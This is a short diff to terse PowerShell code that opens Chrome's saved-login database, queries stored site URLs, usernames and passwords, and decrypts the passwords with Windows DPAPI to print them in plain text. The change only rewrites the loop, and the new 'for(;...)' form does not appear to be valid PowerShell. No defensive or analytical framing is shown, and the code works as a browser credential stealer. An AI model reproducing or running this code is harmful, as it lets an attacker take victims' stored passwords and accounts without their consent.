@@ -5,4 +5,4 @@ $d=0
 $_=$l::sqlite3_open($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data',[ref]$d)
 $s=0
 $_=$l::P($d,"SELECT action_url,username_value,password_value FROM logins",-1,[ref]$s,0)
-while(!($l::sqlite3_step($s)%100)){$l::T($s,0)+","+$l::T($s,1)+","+[System.Text.Encoding]::ASCII.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($l::B($s,2),$null,1))}
+for(;!($l::sqlite3_step($s)%100)){$l::T($s,0)+","+$l::T($s,1)+","+[System.Text.Encoding]::ASCII.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($l::B($s,2),$null,1))}
